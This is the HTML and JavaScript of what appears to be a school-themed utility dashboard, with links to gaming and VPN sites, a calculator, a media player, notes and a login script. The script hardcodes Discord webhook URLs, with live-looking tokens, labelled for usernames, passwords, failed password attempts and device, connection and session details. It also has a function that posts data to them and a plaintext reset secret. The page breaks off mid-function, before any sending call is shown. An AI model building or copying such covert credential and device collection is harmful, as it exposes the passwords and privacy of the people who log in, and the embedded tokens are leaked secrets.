        <div id="schoolMapOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Click button for map information.</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displayUpdateMessage('School Building Map', 'schoolMapDisplay', 'schoolMapOptionsContainer', 'schoolMapGoBackButton')">Show Map</button>
            </div>
        </div>
        <div id="schoolMapDisplay" class="formatted-info-card"></div>
        <button id="schoolMapGoBackButton" class="go-back-button" onclick="goBackToSchoolMapOptions()">Go Back</button>
    </div>
</div>

<div id="phoneDirectoryModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-phone-alt"></i> School Phone Directory</h2>
            <button onclick="closeModal('phoneDirectoryModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="phoneDirectoryOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Click button for directory information.</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displayUpdateMessage('School Phone Directory', 'phoneDirectoryDisplay', 'phoneDirectoryOptionsContainer', 'phoneDirectoryGoBackButton')">Show Directory</button>
            </div>
        </div>
        <div id="phoneDirectoryDisplay" class="formatted-info-card"></div>
        <button id="phoneDirectoryGoBackButton" class="go-back-button" onclick="goBackToPhoneDirectoryOptions()">Go Back</button>
    </div>
</div>

<div id="musicWebsitesModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500">🎵 Music Websites</h2>
            <button onclick="closeModal('musicWebsitesModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="musicWebsitesOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Click button for music websites.</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displayUpdateMessage('Music Websites', 'musicWebsitesDisplay', 'musicWebsitesOptionsContainer', 'musicWebsitesGoBackButton')">Show Music Sites</button>
            </div>
        </div>
        <div id="musicWebsitesDisplay" class="formatted-info-card"></div>
        <button id="musicWebsitesGoBackButton" class="go-back-button" onclick="goBackToMusicWebsitesOptions()">Go Back</button>
    </div>
</div>

<div id="gamingWebsitesModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500">🎮 Gaming Websites</h2>
            <button onclick="closeModal('gamingWebsitesModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="gamingWebsitesOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Click button for gaming websites.</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displayUpdateMessage('Gaming Websites', 'gamingWebsitesDisplay', 'gamingWebsitesOptionsContainer', 'gamingWebsitesGoBackButton')">Show Gaming Sites</button>
            </div>
        </div>
        <div id="gamingWebsitesDisplay" class="formatted-info-card"></div>
        <button id="gamingWebsitesGoBackButton" class="go-back-button" onclick="goBackToGamingWebsitesOptions()">Go Back</button>
    </div>
</div>

<div id="vpnWebsitesModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500">🌐 VPN Websites</h2>
            <button onclick="closeModal('vpnWebsitesModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="vpnWebsitesOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Click button for VPN websites.</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="displayUpdateMessage('VPN Websites', 'vpnWebsitesDisplay', 'vpnWebsitesOptionsContainer', 'vpnWebsitesGoBackButton')">Show VPN Sites</button>
            </div>
        </div>
        <div id="vpnWebsitesDisplay" class="formatted-info-card"></div>
        <button id="vpnWebsitesGoBackButton" class="go-back-button" onclick="goBackToVpnWebsitesOptions()">Go Back</button>
    </div>
</div>

<div id="calculatorModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-calculator"></i> Calculator & Converter</h2>
            <button onclick="closeModal('calculatorModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="calculatorOptionsContainer">
            <p class="text-sm text-gray-400 mb-4">Choose a tool to open:</p>
            <div class="sub-feature-button-container">
                <button class="sub-feature-button" onclick="showCalculator()">Open Calculator</button>
                <button class="sub-feature-button" onclick="showConverter()">Open Unit Converter</button>
            </div>
        </div>
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
            <div id="calculatorView" class="calculator-view calculator formatted-info-card">
                <h3 class="text-xl font-bold text-accent-color mb-4 text-center">Calculator</h3>
                <div class="calc-display" id="calcDisplay">0</div>
                <div class="calc-buttons">
                    <button class="calc-btn" onclick="clearCalc()">C</button>
                    <button class="calc-btn" onclick="deleteLast()">⌫</button>
                    <button class="calc-btn operator" onclick="appendToCalc('/')">/</button>
                    <button class="calc-btn operator" onclick="appendToCalc('*')">×</button>

                    <button class="calc-btn" onclick="appendToCalc('7')">7</button>
                    <button class="calc-btn" onclick="appendToCalc('8')">8</button>
                    <button class="calc-btn" onclick="appendToCalc('9')">9</button>
                    <button class="calc-btn operator" onclick="appendToCalc('-')">-</button>

                    <button class="calc-btn" onclick="appendToCalc('4')">4</button>
                    <button class="calc-btn" onclick="appendToCalc('5')">5</button>
                    <button class="calc-btn" onclick="appendToCalc('6')">6</button>
                    <button class="calc-btn operator" onclick="appendToCalc('+')">+</button>

                    <button class="calc-btn" onclick="appendToCalc('1')">1</button>
                    <button class="calc-btn" onclick="appendToCalc('2')">2</button>
                    <button class="calc-btn" onclick="appendToCalc('3')">3</button>
                    <button class="calc-btn equals" onclick="calculateResult()" rowspan="2">=</button>

                    <button class="calc-btn" onclick="appendToCalc('0')" style="grid-column: span 2;">0</button>
                    <button class="calc-btn" onclick="appendToCalc('.')">.</button>
                </div>
            </div>

            <div id="converterView" class="converter-view calculator formatted-info-card">
                <h3 class="text-xl font-bold text-accent-color mb-4 text-center">Unit Converter</h3>
                <div class="space-y-4">
                    <label class="block text-sm mb-1 text-text-secondary">Conversion Type:</label>
                    <select id="conversionType" class="w-full p-2 bg-primary-bg rounded border border-border-color" onchange="updateConversionUnits()">
                        <option value="length">Length</option>
                        <option value="weight">Weight</option>
                        <option value="temperature">Temperature</option>
                        <option value="volume">Volume</option>
                    </select>

                    <div class="grid grid-cols-2 gap-4 mt-4">
                        <div>
                            <label class="block text-sm mb-1 text-text-secondary">From:</label>
                            <select id="fromUnit" class="w-full p-2 bg-primary-bg rounded border border-border-color">
                            </select>
                            <input type="number" id="fromValue" class="w-full p-2 bg-primary-bg rounded mt-2 border border-border-color" placeholder="Enter value" oninput="convertUnits()">
                        </div>

                        <div>
                            <label class="block text-sm mb-1 text-text-secondary">To:</label>
                            <select id="toUnit" class="w-full p-2 bg-primary-bg rounded border border-border-color" onchange="convertUnits()">
                            </select>
                            <input type="number" id="toValue" class="w-full p-2 bg-primary-bg rounded mt-2 border border-border-color" readonly>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <button id="calculatorGoBackButton" class="go-back-button" onclick="goBackToCalculatorOptions()">Go Back</button>
    </div>
</div>

<div id="mediaPlayerModal" class="settings-modal">
    <div class="settings-content">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-play-circle"></i> Media Player</h2>
            <button onclick="closeModal('mediaPlayerModal')" class="text-2xl text-gray-400 hover:text-white">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="media-container">
            <p class="media-player-warning formatted-info-card text-xs mb-2" style="display: block;">
                <i class="fas fa-exclamation-triangle mr-1"></i> <strong>IMPORTANT: This is NOT a proxy.</strong> This player operates entirely client-side (in your browser) and does NOT use a server-side proxy. Most major media sites (YouTube, Spotify, Netflix, etc.) actively block embedding their content in iframes from different domains due to security policies (`X-Frame-Options`, `Content-Security-Policy`). This is a fundamental browser security feature and **CANNOT BE BYPASSED BY CLIENT-SIDE JAVASCRIPT**. Functionality will be limited to sites that explicitly allow embedding.
            </p>
            <div class="flex gap-2 mb-4">
                <input type="url" id="mediaUrl" class="media-input flex-grow" placeholder="Enter video/music URL (e.g., public video link)...">
                <button class="tool-btn" onclick="loadMedia()"><i class="fas fa-play"></i> Load</button>
            </div>
            <iframe id="mediaFrame" class="media-frame" src="about:blank" frameborder="0" allowfullscreen sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-presentation"></iframe>
            <div class="media-toolbar flex flex-wrap justify-center gap-2 mt-4">
                <button class="tool-btn" onclick="loadMediaFromToolbar('https://www.youtube.com/')"><i class="fab fa-youtube"></i> YouTube</button>
                <button class="tool-btn" onclick="loadMediaFromToolbar('https://www.spotify.com/us/')"><i class="fab fa-spotify"></i> Spotify</button>
                <button class="tool-btn" onclick="loadMediaFromToolbar('https://soundcloud.com/')"><i class="fab fa-soundcloud"></i> SoundCloud</button>
                <button class="tool-btn" onclick="loadMediaFromToolbar('https://twitch.tv/')"><i class="fab fa-twitch"></i> Twitch</button>
                <button class="tool-btn" onclick="loadMediaFromToolbar('https://vimeo.com/')"><i class="fab fa-vimeo-v"></i> Vimeo</button>
                <button class="tool-btn" onclick="loadMediaFromToolbar('https://music.youtube.com/')"><i class="fas fa-music"></i> YT Music</button>
                <button class="tool-btn" onclick="loadMediaFromToolbar('https://www.dailymotion.com/')"><i class="fas fa-tv"></i> Dailymotion</button>
                <button class="tool-btn" onclick="loadMediaFromToolbar('https://archive.org/details/movies')"><i class="fas fa-film"></i> Archive.org</button>
            </div>
        </div>
    </div>
</div>

<div id="settingsModal" class="settings-modal">
<div class="settings-content">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-cog"></i> System Settings</h2>
<button onclick="togglePanel('settingsModal')" class="text-2xl text-gray-400 hover:text-white">
<i class="fas fa-times"></i>
</button>
</div>

<div class="settings-grid">
<div class="setting-item">
<span>Dark Mode</span>
<div class="toggle-switch" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Auto-save Notes</span>
<div class="toggle-switch active" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Sound Notifications</span>
<div class="toggle-switch" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Auto-refresh Data</span>
<div class="toggle-switch active" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Compact View</span>
<div class="toggle-switch" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Show Animations</span>
<div class="toggle-switch active" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>High Contrast</span>
<div class="toggle-switch" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Auto-backup</span>
<div class="toggle-switch active" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Security Mode</span>
<div class="toggle-switch active" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Advanced Logging</span>
<div class="toggle-switch" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Performance Mode</span>
<div class="toggle-switch" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Developer Mode</span>
<div class="toggle-switch" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Experimental Features</span>
<div class="toggle-switch" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Data Compression</span>
<div class="toggle-switch active" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Real-time Sync</span>
<div class="toggle-switch" onclick="toggleSetting(this)">
<div class="toggle-slider"></div>
</div>
</div>
</div>

<div class="mt-8">
<h3 class="text-xl font-bold text-orange-500 mb-4"><i class="fas fa-keyboard"></i> Keybinds Configuration</h3>
<div class="space-y-3" id="keybindsList">
<div class="keybind-item">
<span>Open Settings</span>
<input type="text" class="keybind-input" value="Ctrl+," placeholder="Press keys...">
</div>
<div class="keybind-item">
<span>Quick Search</span>
<input type="text" class="keybind-input" value="Ctrl+K" placeholder="Press keys...">
</div>
<div class="keybind-item">
<span>New Note</span>
<input type="text" class="keybind-input" value="Ctrl+N" placeholder="Press keys...">
</div>
<div class="keybind-item">
<span>Save All</span>
<input type="text" class="keybind-input" value="Ctrl+S" placeholder="Press keys...">
</div>
<div class="keybind-item">
<span>Toggle Theme</span>
<input type="text" class="keybind-input" value="Ctrl+T" placeholder="Press keys...">
</div>
</div>
</div>

<div class="mt-8">
<h3 class="text-xl font-bold text-orange-500 mb-4"><i class="fas fa-palette"></i> Accent Theme Selection</h3>
<div class="theme-selector">
<div class="theme-option active" style="background: linear-gradient(135deg, #ff4500, #ff6b35);" onclick="applyAccentTheme('orange', event)">Orange</div>
<div class="theme-option" style="background: linear-gradient(135deg, #0066cc, #004499);" onclick="applyAccentTheme('blue', event)">Blue</div>
<div class="theme-option" style="background: linear-gradient(135deg, #00cc44, #009933);" onclick="applyAccentTheme('green', event)">Green</div>
<div class="theme-option" style="background: linear-gradient(135deg, #cc0044, #990033);" onclick="applyAccentTheme('red', event)">Red</div>
<div class="theme-option" style="background: linear-gradient(135deg, #8800cc, #6600aa);" onclick="applyAccentTheme('purple', event)">Purple</div>
<div class="theme-option" style="background: linear-gradient(135deg, #ffaa00, #ff8800);" onclick="applyAccentTheme('amber', event)">Amber</div>
<div class="theme-option" style="background: linear-gradient(135deg, #00aaaa, #008888);" onclick="applyAccentTheme('teal', event)">Teal</div>
<div class="theme-option" style="background: linear-gradient(135deg, #ff0088, #cc0066);" onclick="applyAccentTheme('pink', event)">Pink</div>
</div>
</div>
</div>
</div>

<div id="timerPanel" class="settings-modal">
<div class="settings-content">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-stopwatch"></i> Timer & Stopwatch</h2>
<button onclick="togglePanel('timerPanel')" class="text-2xl text-gray-400 hover:text-white">
<i class="fas fa-times"></i>
</button>
</div>

<div class="grid grid-cols-1 md:grid-cols-2 gap-8">
<div class="bg-gray-800 p-6 rounded-lg">
<h3 class="text-lg font-bold mb-4 text-center">Stopwatch</h3>
<div class="timer-display" id="stopwatchDisplay">00:00:00</div>
<div class="timer-controls">
<button class="tool-btn" onclick="startStopwatch()"><i class="fas fa-play"></i> Start</button>
<button class="tool-btn" onclick="pauseStopwatch()"><i class="fas fa-pause"></i> Pause</button>
<button class="tool-btn" onclick="resetStopwatch()"><i class="fas fa-stop"></i> Reset</button>
</div>
</div>

<div class="bg-gray-800 p-6 rounded-lg">
<h3 class="text-lg font-bold mb-4 text-center">Countdown Timer</h3>
<div class="timer-display" id="timerDisplay">00:00:00</div>
<div class="flex justify-center gap-2 mb-4">
<input type="number" id="timerHours" class="w-16 p-2 bg-gray-700 rounded text-center" placeholder="HH" min="0" max="23">
<input type="number" id="timerMinutes" class="w-16 p-2 bg-gray-700 rounded text-center" placeholder="MM" min="0" max="59">
<input type="number" id="timerSeconds" class="w-16 p-2 bg-gray-700 rounded text-center" placeholder="SS" min="0" max="59">
</div>
<div class="timer-controls">
<button class="tool-btn" onclick="startTimer()"><i class="fas fa-play"></i> Start</button>
<button class="tool-btn" onclick="pauseTimer()"><i class="fas fa-pause"></i> Pause</button>
<button class="tool-btn" onclick="resetTimer()"><i class="fas fa-stop"></i> Reset</button>
</div>
</div>
</div>

<div class="mt-8">
<h3 class="text-lg font-bold mb-4"><i class="fas fa-bell"></i> Reminders</h3>
<div class="flex gap-2 mb-4">
<input type="text" id="reminderText" class="flex-1 p-2 bg-gray-700 rounded" placeholder="Reminder text...">
<input type="datetime-local" id="reminderTime" class="p-2 bg-gray-700 rounded">
<button class="tool-btn" onclick="addReminder()"><i class="fas fa-plus"></i> Add</button>
</div>
<div id="remindersList" class="space-y-2">
</div>
</div>
</div>
</div>

<div id="notesPanel" class="settings-modal">
<div class="settings-content">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-pen"></i> Enhanced Notes</h2>
<button onclick="togglePanel('notesPanel')" class="text-2xl text-gray-400 hover:text-white">
<i class="fas fa-times"></i>
</button>
</div>

<div class="drawing-tools">
<button class="tool-btn active" data-tool="pen" onclick="selectTool(this, 'pen')">
<i class="fas fa-pen"></i> Pen
</button>
<button class="tool-btn" data-tool="brush" onclick="selectTool(this, 'brush')">
<i class="fas fa-paint-brush"></i> Brush
</button>
<button class="tool-btn" data-tool="eraser" onclick="selectTool(this, 'eraser')">
<i class="fas fa-eraser"></i> Eraser
</button>
<button class="tool-btn" data-tool="text" onclick="selectTool(this, 'text')">
<i class="fas fa-text-height"></i> Text
</button>
<button class="tool-btn" data-tool="line" onclick="selectTool(this, 'line')">
<i class="fas fa-minus"></i> Line
</button>
<button class="tool-btn" data-tool="rectangle" onclick="selectTool(this, 'rectangle')">
<i class="fas fa-square"></i> Rectangle
</button>
<button class="tool-btn" data-tool="circle" onclick="selectTool(this, 'circle')">
<i class="fas fa-circle"></i> Circle
</button>

<div class="flex items-center gap-2">
<label class="text-sm">Color:</label>
<input type="color" id="penColor" class="color-picker" value="#ff4500">
</div>

<div class="flex items-center gap-2">
<label class="text-sm">Thickness:</label>
<input type="range" id="penThickness" class="thickness-slider" min="1" max="20" value="2">
</div>

<div class="flex items-center gap-2">
<label class="text-sm">Material:</label>
<select id="penMaterial" class="bg-gray-700 text-white p-1 rounded">
<option value="solid">Solid</option>
<option value="dashed">Dashed</option>
<option value="dotted">D-otted</option>
</select>
</div>

<button class="tool-btn" onclick="clearCanvas()">
<i class="fas fa-trash"></i> Clear
</button>
<button class="tool-btn" onclick="saveCanvas()">
<i class="fas fa-save"></i> Save
</button>
</div>

<canvas id="drawingCanvas" width="760" height="400" class="w-full border border-gray-600 rounded mt-4 bg-white cursor-crosshair"></canvas>

<div class="mt-6">
<h3 class="text-lg font-bold mb-2"><i class="fas fa-sticky-note"></i> Text Notes</h3>
<textarea id="textNotes" class="w-full h-32 p-3 bg-gray-700 rounded resize-none" placeholder="Type your notes here..."></textarea>
<div class="flex gap-2 mt-2">
<button class="tool-btn" onclick="saveTextNotes()"><i class="fas fa-save"></i> Save Notes</button>
<button class="tool-btn" onclick="clearTextNotes()"><i class="fas fa-trash"></i> Clear Notes</button>
</div>
</div>
</div>
</div>

<div id="calculatorPanel" class="settings-modal" style="display:none;">
<div class="settings-content">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-calculator"></i> Calculator & Converter</h2>
<button onclick="togglePanel('calculatorPanel')" class="text-2xl text-gray-400 hover:text-white">
<i class="fas fa-times"></i>
</button>
</div>

<div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
<div class="calculator">
<h3 class="text-lg font-bold mb-4 text-center">Calculator</h3>
<div class="calc-display" id="calcDisplay">0</div>
<div class="calc-buttons">
<button class="calc-btn" onclick="clearCalc()">C</button>
<button class="calc-btn" onclick="deleteLast()">⌫</button>
<button class="calc-btn operator" onclick="appendToCalc('/')">/</button>
<button class="calc-btn operator" onclick="appendToCalc('*')">×</button>

<button class="calc-btn" onclick="appendToCalc('7')">7</button>
<button class="calc-btn" onclick="appendToCalc('8')">8</button>
<button class="calc-btn" onclick="appendToCalc('9')">9</button>
<button class="calc-btn operator" onclick="appendToCalc('-')">-</button>

<button class="calc-btn" onclick="appendToCalc('4')">4</button>
<button class="calc-btn" onclick="appendToCalc('5')">5</button>
<button class="calc-btn" onclick="appendToCalc('6')">6</button>
<button class="calc-btn operator" onclick="appendToCalc('+')">+</button>

<button class="calc-btn" onclick="appendToCalc('1')">1</button>
<button class="calc-btn" onclick="appendToCalc('2')">2</button>
<button class="calc-btn" onclick="appendToCalc('3')">3</button>
<button class="calc-btn equals" onclick="calculateResult()" rowspan="2">=</button>

<button class="calc-btn" onclick="appendToCalc('0')" style="grid-column: span 2;">0</button>
<button class="calc-btn" onclick="appendToCalc('.')">.</button>
</div>
</div>

<div class="bg-gray-800 p-6 rounded-lg">
<h3 class="text-lg font-bold mb-4 text-center">Unit Converter</h3>
<div class="space-y-4">
<select id="conversionType" class="w-full p-2 bg-gray-700 rounded" onchange="updateConversionUnits()">
<option value="length">Length</option>
<option value="weight">Weight</option>
<option value="temperature">Temperature</option>
<option value="volume">Volume</option>
</select>

<div class="grid grid-cols-2 gap-4">
<div>
<label class="block text-sm mb-1">From:</label>
<select id="fromUnit" class="w-full p-2 bg-gray-700 rounded">
<option value="m">Meters</option>
<option value="km">Kilometers</option>
<option value="cm">Centimeters</option>
<option value="mm">Millimeters</option>
<option value="in">Inches</option>
<option value="ft">Feet</option>
</select>
<input type="number" id="fromValue" class="w-full p-2 bg-gray-700 rounded mt-2" placeholder="Enter value" oninput="convertUnits()">
</div>

<div>
<label class="block text-sm mb-1">To:</label>
<select id="toUnit" class="w-full p-2 bg-gray-700 rounded" onchange="convertUnits()">
<option value="m">Meters</option>
<option value="km">Kilometers</option>
<option value="cm">Centimeters</option>
<option value="mm">Millimeters</option>
<option value="in">Inches</option>
<option value="ft">Feet</option>
</select>
<input type="number" id="toValue" class="w-full p-2 bg-gray-700 rounded mt-2" readonly>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<div id="statsPanel" class="settings-modal">
<div class="settings-content">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-chart-bar"></i> Usage Statistics</h2>
<button onclick="togglePanel('statsPanel')" class="text-2xl text-gray-400 hover:text-white">
<i class="fas fa-times"></i>
</button>
</div>

<div class="stats-grid">
<div class="stat-item">
<div class="stat-number" id="buttonPresses">0</div>
<div class="stat-label">Button Presses</div>
</div>
<div class="stat-item">
<div class="stat-number" id="toggleSwitches">0</div>
<div class="stat-label">Toggle Switches</div>
</div>
<div class="stat-item">
<div class="stat-number" id="panelsOpened">0</div>
<div class="stat-label">Panels Opened</div>
</div>
<div class="stat-item">
<div class="stat-number" id="panelsClosed">0</div>
<div class="stat-label">Panels Closed</div>
</div>
<div class="stat-item">
<div class="stat-number" id="searchQueries">0</div>
<div class="stat-label">Search Queries</div>
</div>
<div class="stat-item">
<div class="stat-number" id="sessionTime">00:00:00</div>
<div class="stat-label">Session Time</div>
</div>
</div>

<div class="mt-8">
<canvas id="statsChart" style="height: 400px;"></canvas>
</div>
</div>
</div>
</div>

<script>
let currentUser = '';
let currentUserID = '';
let attempts = 3;
let is24HourFormat = false;
let currentZoom = 1;
let activityLogs = [];
let loginHistory = [];
let importantDates = [];
let clickCount = 0;
let errorLogs = [];

let whitelist = [];
const WHITELIST_URL = "https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json";
const RESET_CODE_SECRET = 'Reset.2579';

const webhooks = {
usernameInformation: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
passwordInformation: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
identifierInformation: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
invaildUsernameInformation: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
invaildPasswordInformation: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
invaildIdentifierInformation: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
attemptCounterInformation: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
attemptExceededInformation: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHoIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
resetInformation: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq',
correctInformation: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
incorrectInformation: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip',
userInformation: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
browserInformation: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
deviceInformation: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
connectionInformation: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
sessionInformation: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
};

let stats = {
buttonPresses: 0,
toggleSwitches: 0,
panelsOpened: 0,
panelsClosed: 0,
searchQueries: 0,
sessionStartTime: null
};
let isLightMode = false;

let stopwatchInterval = null;
let stopwatchTime = 0;
let timerInterval = null;
let timerTime = 0;
let isStopwatchRunning = false;
let isTimerRunning = false;

let isDrawing = false;
let currentTool = 'pen';
let currentColor = '#ff4500';
let currentThickness = 2;
let canvas, ctx;

let calcDisplay = '';
let calcOperation = '';

const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const userIDInput = document.getElementById('userID');
const submitBtn = document.getElementById('submitBtn');
const errorMsg = document.getElementById('errorMsg');
const attemptsText = document.getElementById('attemptsText');
const resetPopup = document.getElementById('resetPopup');
const resetField = document.getElementById('resetField');
const resetBtn = document.getElementById('resetBtn');

const EMBED_FIELD_LIMIT = 25;

function createEmbedsFromFields(title, color, fields, description = null) {
const embeds = [];
for (let i = 0; i < fields.length; i += EMBED_FIELD_LIMIT) {
const chunk = fields.slice(i, i + EMBED_FIELD_LIMIT);
embeds.push({
title: i === 0 ? title : `${title} (Part ${Math.floor(i / EMBED_FIELD_LIMIT) + 1})`,
description: i === 0 ? description : null,
color: color,
fields: chunk
});
}
if (embeds.length === 0) {
embeds.push({
title: title,
description: description || "No specific details available.",
color: color
});
}
return embeds;
}

async function sendWebhook(url, embeds, username = "System Logger") {
if (!url) {
console.error("Webhook URL is undefined for sending embeds:", embeds);
logError(`Attempted to send webhook with undefined URL for embed.`);
return;
}

const finalEmbeds = embeds.map(embed => ({
...embed,
timestamp: embed.timestamp || new Date().toISOString(),
footer: {
text: `${username} | ${navigator.userAgent.substring(0, Math.min(250, navigator.userAgent.length))}...`
}
}));

try {
const response = await fetch(url, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
},
body: JSON.stringify({ embeds: finalEmbeds }),
});

if (!response.ok) {
const errorText = await response.text();
throw new Error(`Discord API error: ${response.status} - ${errorText}`);
}
} catch (error) {
console.error('Error sending webhook:', error);
logError(`Failed to send webhook to ${url}: ${error.message}`);
}
}

async function loadWhitelist() {
try {
const response = await fetch(WHITELIST_URL);
if (!response.ok) {
throw new Error(`HTTP error! status: ${response.status}`);
}
whitelist = await response.json();
logActivity("Whitelist loaded successfully.");
} catch (error) {
console.error("Failed to load whitelist:", error);
logError(`Failed to load whitelist: ${error.message}`);
}
}

function parseUserAgent() {
const ua = navigator.userAgent;
let browserName = "Unknown Browser";
let browserVersion = "Unknown";
let os = "Unknown OS";
let osVersion = "Unknown";
let engine = "Unknown Engine";
let deviceType = "Desktop";

if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) {
browserName = "Chrome";
browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || "Unknown";
engine = "Blink";
} else if (/Firefox/.test(ua)) {
browserName = "Firefox";
browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || "Unknown";
engine = "Gecko";
} else if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Edge/.test(ua)) {
browserName = "Safari";
browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown";
engine = "WebKit";
} else if (/Edge/.test(ua)) {
browserName = "Edge";
